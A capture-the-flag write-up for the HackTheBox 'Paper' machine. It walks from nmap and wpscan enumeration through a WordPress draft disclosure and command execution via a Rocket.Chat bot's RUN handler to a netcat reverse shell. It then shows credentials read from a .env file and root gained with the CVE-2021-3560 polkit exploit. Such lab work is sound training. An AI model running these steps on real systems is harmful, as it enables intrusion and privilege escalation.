### Paper HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.143

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.11.143 -p22,80,443 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 20:44 WAT
Nmap scan report for 10.10.11.143
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.83 seconds
```

The web page just shows the default cent-os page both on port 80 & 44

Checking the server head leaks it domain name

```
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ curl -I http://10.10.11.143/
HTTP/1.1 403 Forbidden
Date: Tue, 07 Feb 2023 20:28:43 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8

```

i'll update my /etc/hosts file and add the new domain 

```
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ cat /etc/hosts | grep office                                                                                           
10.10.11.143    office.paper
```

On navigating to the new host gotten it shows a web page made with wordpress
![image](https://user-images.githubusercontent.com/113513376/217359184-f871aa6b-fff8-41c4-8dca-0c2268c37bc3.png)

It has few posts in it and usernames are been leaked
![image](https://user-images.githubusercontent.com/113513376/217359628-3c1c80cc-45c0-42b8-9759-6ccf364f176e.png)

```
I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.
So, other employees who were added to this blog are now removed.
As of now there is only one user in this blog. Which is me! Just me.

Comment:
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick
```

I'll enumerate the wordpress 

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Paper]
└─$ wpscan --url office.paper/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ _
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Tue Feb  7 21:43:36 2023
Interesting Finding(s):
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:08 <=====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:08

[i] User(s) Identified:

[+] prisonmike
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] nick
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] creedthoughts
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Feb  7 21:43:55 2023
[+] Requests Done: 28
[+] Cached Requests: 36
[+] Data Sent: 7.751 KB
[+] Data Received: 114.63 KB
[+] Memory used: 167.785 MB
[+] Elapsed time: 00:00:18
 ```
 
 We see its version `WordPress version 5.2.3` 
 
 I'll search for exploit 
 ![image](https://user-images.githubusercontent.com/113513376/217363682-e6ce651c-b1b7-46d5-8041-44424287624a.png)

We see this exploit [Exploit](https://wpscan.com/vulnerability/9909)

And it makes sense cause of the comment given 

```
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick
```

![image](https://user-images.githubusercontent.com/113513376/217364059-3f04c6dc-6f66-4a92-9fc1-2c07013b43d5.png)


Now we get information disclosure of the private drafts

```
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
# Also, stop looking at my drafts. Jeez!
```

So we have a new vhost `http://chat.office.paper/register/8qozr226AhkCHZdyY`

I'll add that to `/etc/hosts` and access it 

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Paper]
└─$ cat /etc/hosts | grep paper                                                                                            
10.10.11.143    office.paper chat.office.paper
```

Now i'll access it, and i get a register page 
![image](https://user-images.githubusercontent.com/113513376/217365978-b5740491-aa30-4fdd-8cca-2c5e3f330fcf.png)

I'll create an account and login with it

After loggin i went to the channel group

So basically after i read the chat i learnt that there's a bot called `recyclops` that can do many stuffs and we have access to directly message it
![image](https://user-images.githubusercontent.com/113513376/217367230-9b8828a3-cbc3-4253-a88d-14936119f413.png)

I DM the bot to interact with it
![image](https://user-images.githubusercontent.com/113513376/217367538-90bd7316-d3b6-473c-8097-33a147bacdc2.png)
![image](https://user-images.githubusercontent.com/113513376/217367604-6026ccbd-ea2d-42ab-b0a9-d76eb605e9c3.png)

If you notice we see the bot can list sales, can get the content of a file
![image](https://user-images.githubusercontent.com/113513376/217367789-53f10d92-a13c-4f39-8ed6-5713115904ce.png)

So basically since this bot list the files nd directory in its cwd its obviously doing it in form of a command `ls` 

I'll check for command injection but i can't seem to get it work

I was able to list files can get content of /etc/passwd
![image](https://user-images.githubusercontent.com/113513376/217370615-518e3768-ad33-4d98-84e2-c31b4bee77d6.png)
![image](https://user-images.githubusercontent.com/113513376/217370677-b3e238df-bb67-48e6-80ed-aaeef7b44f6e.png)

So i searched for `RocketChat` and it turns out to be a real app [Rocket.Chat](https://github.com/RocketChat/Rocket.Chat)

Looking at the github repo i see some important files like app.json, package.json etc. 

I'll read the content of app.json as its the configuration file used by the RocketChat applications to store metadata about the app, such as its name, icons, start-up screen, and more. 

Using the functions of the bot i'll read its content
![image](https://user-images.githubusercontent.com/113513376/217374938-5334cdab-d054-41d6-b010-476a3f0f3e89.png)

I wasn't able to get the app.json file so i started searching for other file then saw run.js 
![image](https://user-images.githubusercontent.com/113513376/217376212-8a98ceb3-83e3-429f-a4e4-93cfc8be41c8.png)

So we see this is the code that controls the command the bot runs
![image](https://user-images.githubusercontent.com/113513376/217376382-0bb5e9f1-cc0c-4b54-8146-eae4e6e56b5b.png)

So here's whats happening

```
This is a JavaScript code that exports a function that acts as a handler for a chatbot built using the Hubot framework. The handler listens for a message in the chat that matches the regular expression /RUN (.*)$/i. The regular expression matches any message that starts with "RUN" followed by a space and some text. The text is captured and stored in the cmd variable.

When a message that matches the regular expression is received, the handler sends a message to the chat saying "Running [captured text]". It then uses the child_process.exec function from the Node.js child_process module to execute the command stored in cmd. If there is an error executing the command, it sends the error message to the chat, otherwise, it sends the output of the command to the chat.
```

Thanks ChatGPT 🤟🏼

So basically we can run commands ( os command) using `RUN` then what we want to run
![image](https://user-images.githubusercontent.com/113513376/217376926-aa87a526-e70a-4f60-aaae-bb0e6a09f813.png)

Lets get a reverse shell then xD
![image](https://user-images.githubusercontent.com/113513376/217377162-b6aa25af-af47-4b83-ad4c-386f3cd96880.png)

Back on the listener

```                                  
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Paper]
└─$ nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.143] 55216
bash: cannot set terminal process group (1717): Inappropriate ioctl for device
bash: no job control in this shell
[dwight@paper hubot]$ 
```

Now i'll stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now lets get root

The kernel version is pretty old and there's gcc installed on the box

```
[dwight@paper hubot]$ uname -a
Linux paper 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
[dwight@paper hubot]$ which gcc
/usr/bin/gcc
[dwight@paper hubot]$ 
```

Searching for exploit leads to [PolKit](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

I'll download it then upload it to the target and run it

```
[dwight@paper lol]$ ./root.sh                                                                                                                                                                                      
                                                                                                                                                                                                                   
[!] Username set as : secnigma                                                                                                                                                                                     
[!] No Custom Timing specified.                                                                                                                                                                                    
[!] Timing will be detected Automatically                                                                                                                                                                          
[!] Force flag not set.                                                                                                                                                                                            
[!] Vulnerability checking is ENABLED!                                                                                                                                                                             
[!] Starting Vulnerability Checks...                                                                                                                                                                               
[!] Checking distribution...                                                                                                                                                                                       
[!] Detected Linux distribution as "centos"                                                                                                                                                                        
[!] Checking if Accountsservice and Gnome-Control-Center is installed                                                                                                                                              
[+] Accounts service and Gnome-Control-Center Installation Found!!                                                                                                                                                 
[!] Checking if polkit version is vulnerable                                                                                                                                                                       
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper lol]$ sudo bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility. 

[sudo] password for dwight: 
[dwight@paper lol]$ su - secnigma
Password: 
```

It asks for password and i don't know any password

I searched around the hubot and got a cred

```
[dwight@paper ~]$ cd hubot/                                                                                                                                                                                        
[dwight@paper hubot]$ ls                                                                                                                                                                                           
'\'               external-scripts.json   package.json        README.md                                                                                                                                            
 127.0.0.1:8000   LICENSE                 package.json.bak    scripts                                                                                                                                              
 127.0.0.1:8080   node_modules            package-lock.json   start_bot.sh                                                                                                                                         
 bin              node_modules_bak        Procfile            yarn.lock                                                                                                                                            
[dwight@paper hubot]$ cat .env 
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
[dwight@paper hubot]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility. 

[sudo] password for dwight: 
Sorry, user dwight may not run sudo on paper.
```

I tried switching to the user with dwight pass but lool i was wrong

My bad i didn't read the usage lool

```
CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma

Original research by Kevin Backhouse
https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#vulnerability

USAGE:
./poc.sh
Optional Arguments:
        -h --help
        -u=Enter custom username to insert (OPTIONAL)
        -p=Enter custom password to insert (OPTIONAL)
        -f=y, To skip vulnerability check and force exploitation. (OPTIONAL)
        -t=Enter custom sleep time, instead of automatic detection (OPTIONAL)
        Format to enter time: '-t=.004' or '-t=0.004' if you want to set sleep time as 0.004ms 
Note:
Equal to symbol (=) after specifying an option is mandatory.
If you don't specify the options, then the script will automatically detect the possible time and
will try to insert a new user using that time.
Default credentials are 'secnigma:secnigmaftw'
If the exploit ran successfully, then you can login using 'su - secnigma'
and you can spawn a bash shell as root using 'sudo bash'
IMPORTANT: THIS IS A TIMING BASED ATTACK. MULTIPLE TRIES ARE USUALLY REQUIRED!!

[dwight@paper lol]$
```

So the password is `secnigmaftw`

I'll run the exploit and switch to the user the `sudo bash` this has to be done quickly cause the injected user will be removed after few seconds

```
[dwight@paper lol]$ ./root.sh                                                                                                                                                                                      
[!] Username set as : secnigma                                                                                                                                                                                     
[!] No Custom Timing specified.                                                                                                                                                                                    
[!] Timing will be detected Automatically                                                                                                                                                                          
[!] Force flag not set.                                                                                                                                                                                            
[!] Vulnerability checking is ENABLED!                                                                                                                                                                             
[!] Starting Vulnerability Checks...                                                                                                                                                                               
[!] Checking distribution...                                                                                                                                                                                       
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper lol]$ su - secnigma
Password: 
[secnigma@paper ~]$ sudo bash
[sudo] password for secnigma: 
[root@paper secnigma]# cd /root
[root@paper ~]# 
```

And we're done 

<br> <br> 
[Back To Home](../../index.md)


